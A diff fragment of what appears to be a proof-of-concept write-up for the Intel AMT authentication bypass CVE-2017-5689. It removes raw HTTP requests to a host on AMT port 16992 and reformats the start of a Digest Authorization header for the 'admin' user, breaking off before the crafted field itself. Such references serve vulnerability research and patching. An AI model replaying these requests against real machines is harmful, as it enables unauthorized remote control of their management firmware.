@@ -22,59 +22,12 @@ CVE-2017-5689
   Technology (AMT), Intel Standard Manageability (ISM), and Intel Small 
   Business Technology (SBT).
  
-################################################################################
-
- FIRST REQUEST:
- 
-################################################################################
-
- GET /index.htm HTTP/1.1
- 
- Host: 192.168.0.44:16992
- 
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 
- 
-   Firefox/73.0
-   
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
- 
-   */*;q=0.8
-   
- Accept-Language: en-US,en;q=0.5
- 
- Accept-Encoding: gzip, deflate
- 
- Connection: close
- 
- Referer: http://192.168.0.44:16992/logon.htm
- 
- Upgrade-Insecure-Requests: 1
-
 ###############################################################################
-
- SECOND REQUEST
- 
-###############################################################################
- 
- GET /index.htm HTTP/1.1
- 
- Host: 192.168.0.44:16992
-
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
-
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-
- Accept-Language: en-US,en;q=0.5
-
- Accept-Encoding: gzip, deflate
-
- Connection: close
 
  Referer: http://192.168.0.44:16992/logon.htm
 
- Upgrade-Insecure-Requests: 1
- 
- Authorization: Digest username="admin", 
+ Authorization: 
+       Digest username="admin", 
        
        realm="Digest:72C40000000000000000000000000000", 
        
